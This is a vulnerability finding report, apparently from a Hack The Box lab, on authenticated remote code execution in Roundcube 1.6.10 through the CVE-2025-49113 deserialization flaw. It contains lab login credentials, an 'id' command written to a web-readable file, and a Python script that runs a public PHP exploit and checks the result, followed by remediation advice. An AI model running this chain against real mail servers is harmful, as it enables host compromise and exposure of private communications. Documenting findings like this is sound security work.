# Authenticated Remote Code Execution in Roundcube via Deserialization in Upload Workflow

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-02-27 10:11:02 UTC
**Target:** http://mail.outbound.htb
**Endpoint:** /?_task=settings&_action=upload, /?_task=logout, /roundcube/logs/poc49113.txt
**Method:** POST, GET
**CVE:** CVE-2025-49113
**CWE:** CWE-502
**CVSS:** 9.9

## Description

A critical authenticated remote code execution vulnerability was confirmed in Roundcube Webmail 1.6.10 on mail.outbound.htb. The issue is caused by unsafe handling of user-controlled data in the settings upload workflow, allowing PHP object deserialization and command execution on the server.

The vulnerability is reachable after valid user authentication. During validation, a public exploit path for CVE-2025-49113 was executed successfully against the target application, resulting in server-side command execution under the web server account.

This finding is fully validated with direct execution evidence retrieved from the target over HTTP.

## Impact

An attacker with valid Roundcube credentials can execute arbitrary OS commands on the mail server as the web application user. This enables immediate post-authentication host compromise actions such as data access, credential harvesting, mailbox manipulation, lateral movement preparation, and persistence attempts.

Given the role of webmail systems in enterprise environments, compromise can expose sensitive communications and create a stepping stone toward broader infrastructure compromise.

## Technical Analysis

The vulnerable flow is in Roundcube’s settings upload handling where attacker-controlled input can reach unsafe deserialization behavior. In the vulnerable version range (including 1.6.10), crafted request data can instantiate attacker-controlled object structures and invoke command execution paths.

Validated exploitation chain:
The application accepted authenticated session context and processed crafted upload workflow requests tied to settings actions.
A command payload was executed server-side and wrote proof output to a web-accessible file.
Retrieving the file confirmed command execution context as uid=33(www-data) gid=33(www-data).

Observed evidence:
GET /roundcube/logs/poc49113.txt returned command output containing uid=33(www-data), proving real code execution on the host.

## Proof of Concept

Reproduction steps:

1. Authenticate to Roundcube with a valid account on the target (e.g., tyler / LhKL1o9Nm3X2).

2. Use a CVE-2025-49113 exploit path against the authenticated session to execute an OS command. The validated command used was:
id > /var/www/html/roundcube/logs/poc49113.txt

3. Trigger execution through the vulnerable upload/settings workflow as implemented by the public CVE exploit chain.

4. Request the generated file:
GET http://mail.outbound.htb/roundcube/logs/poc49113.txt

5. Confirm successful RCE from response content:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

6. Negative control validation:
Repeat exploit attempt with invalid credentials; exploitation fails due to authentication failure and no proof file creation.

```
import subprocess
import requests

TARGET = "http://mail.outbound.htb"
USERNAME = "tyler"
PASSWORD = "LhKL1o9Nm3X2"
CMD = "id > /var/www/html/roundcube/logs/poc49113.txt"

# Public exploit implementation for CVE-2025-49113 (PHP PoC)
# Example source: fearsoff-org/CVE-2025-49113
POC_FILE = "CVE-2025-49113.php"


def run_exploit():
    proc = subprocess.run(
        ["php", POC_FILE, TARGET, USERNAME, PASSWORD, CMD],
        text=True,
        capture_output=True
    )
    print(proc.stdout)
    if proc.returncode != 0:
        print(proc.stderr)
        raise RuntimeError("Exploit execution failed")


def verify_rce():
    url = f"{TARGET}/roundcube/logs/poc49113.txt"
    r = requests.get(url, timeout=10)
    print("HTTP", r.status_code)
    print(r.text.strip())
    if r.status_code == 200 and "uid=33(www-data)" in r.text:
        print("[+] RCE confirmed")
        return True
    raise RuntimeError("RCE not confirmed")


if __name__ == "__main__":
    run_exploit()
    verify_rce()
```

## Remediation

1. Upgrade Roundcube immediately to a fixed version:
   Upgrade 1.6.x to 1.6.11 or later (or the latest supported stable release).

2. Invalidate active sessions after upgrade:
   Force logout/session rotation for all users to reduce risk from potentially compromised sessions.

3. Restrict dangerous execution primitives at PHP level:
   Disable unnecessary command execution functions where operationally feasible and enforce hardened PHP configuration.

4. Harden web server exposure:
   Block direct web access to internal log and sensitive application directories, and enforce deny rules for runtime/log paths.

5. Monitor for exploitation indicators:
   Review web/access/application logs for suspicious settings upload requests and anomalous parameters associated with deserialization payloads.

6. Conduct post-remediation validation:
   Retest the same exploit chain to confirm non-exploitability and absence of command execution side effects.
